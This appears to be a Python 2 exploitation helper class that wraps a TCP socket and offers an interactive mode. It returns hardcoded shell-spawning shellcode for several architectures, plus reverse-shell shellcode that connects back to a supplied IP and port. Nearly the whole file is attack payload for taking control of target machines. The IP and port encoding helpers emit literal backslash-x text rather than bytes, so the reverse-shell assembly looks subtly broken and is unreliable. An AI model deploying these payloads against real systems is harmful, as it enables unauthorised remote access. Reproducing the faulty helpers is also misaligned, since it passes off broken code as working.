#!/usr/bin/python
import socket
import telnetlib
import struct
import sys
import os

class SecuritySocket:


    def __init__(self, host=None, port=None):
        if(host!=None and port!=None):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((host, port))

    def readuntil(self, delim):
        data = ''
        while True:
            data += self.socket.recv(1)
            if(delim in data): break
        return data

    def readall(self):
        data = self.socket.recv(1024)
        return data

    def send(self,data):
        self.socket.send(data)

    def interactive(self):
        t = telnetlib.Telnet()
        t.sock = self.socket
        t.interact()

    def getShellcode(self, arch):
        shellcode = ""
        if(arch=="x86/linux"): #24 bytes
            shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
        if(arch=="x86/bsd"): #24 bytes
            shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x50\x53\x50\x6a\x3b\x58\xcd\x80"
        if(arch=="x86-64/linux"): #27 bytes
            shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
        if(arch=="x86/linux/poly"): #24 bytes
            shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
        if(arch=="arm"):
            shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"

        return shellcode

    def getReverseShellcode(self, arch, ip, port):
        shellcode = ""
        IPADDR = self.ip2hex(ip)
        PORT = self.port2hex(port)

        if(arch=="x86-64/linux"): #118 bytes
            shellcode  = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
            shellcode += "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
            shellcode += "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
            shellcode += "\x02"+PORT+"\xc7\x44\x24\x04"+IPADDR+"\x48\x89\xe6\x6a\x10"
            shellcode += "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
            shellcode += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
            shellcode += "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
            shellcode += "\x5f\x6a\x3b\x58\x0f\x05"

        if(arch=="x86/linux"): #74 bytes
            shellcode  = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68"
            shellcode += IPADDR+PORT+"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59"
            shellcode += "\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68"
            shellcode += "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

        return shellcode


    def ip2hex(self,ip):
        ip = ip.split('.')
        fixArray = {"x0", "x1", "x2", "x3", "x4", "x5", "x6", "x7", "x8", "x9"}
        ipAdrr = hex(int(ip[0])).zfill(2) + hex(int(ip[1])).zfill(2) + hex(int(ip[2])).zfill(2) + hex(int(ip[3])).zfill(2)
        ipAdrr = ipAdrr.replace('0x', '\\x')
        for fix in fixArray:
            if(fix in ipAdrr.split('\\')):
                toFix = self.hexFixer(fix)
                ipAdrr = ipAdrr.replace(fix, toFix)
        return ipAdrr

    def port2hex(self,port):
        hexPort = hex(int(port)).zfill(2)
        hexPort = hexPort.replace('0x', '')
        first = "\\x"+str(hexPort[:2])
        end = "\\x"+str(hexPort[2:])
        hexPort = first+end
        return hexPort


    def hexFixer(self, x):
        return {
            "x0": "x00",
            "x1": "x01",
            "x2": "x02",
            "x3": "x03",
            "x4": "x04",
            "x5": "x05",
            "x6": "x06",
            "x7": "x07",
            "x8": "x08",
            "x9": "x09"
        }[x]